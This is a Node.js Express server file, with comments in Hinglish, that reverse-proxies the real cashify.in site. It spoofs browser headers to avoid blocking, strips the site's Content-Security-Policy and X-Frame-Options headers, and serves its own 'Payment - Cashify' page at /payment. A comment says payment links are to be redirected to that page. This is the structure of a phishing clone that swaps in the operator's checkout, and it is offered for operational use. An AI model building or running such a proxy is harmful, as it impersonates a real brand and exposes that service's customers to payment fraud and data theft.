import express from "express";
import { createProxyMiddleware } from "http-proxy-middleware";
import cors from "cors";
import { fileURLToPath } from "url";
import path from "path";
import fs from "fs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// CORS allow karo
app.use(cors());

// ─── Custom Payment Page ──────────────────────────────────────────────────────
// /payment route → apna custom React build serve karo
app.use("/payment", (req, res) => {
  const indexPath = path.join(__dirname, "dist", "index.html");
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Payment - Cashify</title>
        <style>
          * { margin: 0; padding: 0; box-sizing: border-box; }
          body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
          .card { background: white; border-radius: 16px; padding: 40px; max-width: 480px; width: 90%; box-shadow: 0 4px 24px rgba(0,0,0,0.1); }
          h1 { color: #e05c00; margin-bottom: 8px; font-size: 24px; }
          p { color: #666; margin-bottom: 24px; }
          .back { color: #e05c00; text-decoration: none; font-weight: 600; }
        </style>
      </head>
      <body>
        <div class="card">
          <h1>💳 Payment Page</h1>
          <p>Custom payment page loading... Run <code>npm run build</code> pehle.</p>
          <a class="back" href="/">← Wapas Jao</a>
        </div>
      </body>
      </html>
    `);
  }
});

// ─── Reverse Proxy → cashify.in ──────────────────────────────────────────────
// Baaki sab routes real cashify.in pe forward karo
app.use(
  "/",
  createProxyMiddleware({
    target: "https://www.cashify.in",
    changeOrigin: true,
    secure: true,
    followRedirects: true,
    on: {
      proxyReq: (proxyReq, req) => {
        // Browser jaise lagao — block na ho
        proxyReq.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
        proxyReq.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
        proxyReq.setHeader("Accept-Language", "en-US,en;q=0.9");
        proxyReq.setHeader("Referer", "https://www.cashify.in/");
        console.log(`[proxy] → ${req.method} ${req.url}`);
      },
      proxyRes: (proxyRes, req, res) => {
        // Payment page links ko apne /payment pe redirect karo
        const contentType = proxyRes.headers["content-type"] || "";
        if (contentType.includes("text/html")) {
          // CSP hatao taaki page load ho sake
          delete proxyRes.headers["content-security-policy"];
          delete proxyRes.headers["x-frame-options"];
        }
        console.log(`[proxy] ← ${proxyRes.statusCode} ${req.url}`);
      },
      error: (err, req, res) => {
        console.error("[proxy] Error:", err.message);
        res.status(502).send(`
          <html>
            <body style="font-family:sans-serif;text-align:center;padding:60px">
              <h2>⚠️ Proxy Error</h2>
              <p>${err.message}</p>
              <a href="/">Retry</a>
            </body>
          </html>
        `);
      },
    },
  })
);

app.listen(PORT, () => {
  console.log(`\n🚀 Cashify Proxy Server chal raha hai!`);
  console.log(`   http://localhost:${PORT}          → cashify.in (proxied)`);
  console.log(`   http://localhost:${PORT}/payment  → Custom Payment Page\n`);
});
